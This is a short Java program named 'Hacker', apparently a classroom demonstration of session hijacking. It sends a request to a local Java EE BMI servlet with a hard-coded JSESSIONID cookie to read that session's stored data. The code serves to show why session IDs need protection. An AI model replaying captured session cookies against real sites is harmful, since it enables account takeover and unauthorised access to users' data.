
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.apache.commons.io.IOUtils;

public class Hacker {
    /*
      透過Session Id 來看裡面的資料
    */

    public static void main(String[] args) throws IOException {
        String path = "http://localhost:8080/JavaEE_Web/controller/bmi_session";
        String sessionID = "4896E52D84732A50E329A17D727284A3";
        URL url = new URL(path);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        // 塞入一個 header
        conn.setRequestProperty("Cookie", "JSESSIONID=4896E52D84732A50E329A17D727284A3");
        conn.connect();
        InputStream is = conn.getInputStream();
        System.out.println(IOUtils.toString(is,"utf-8"));
    }
}
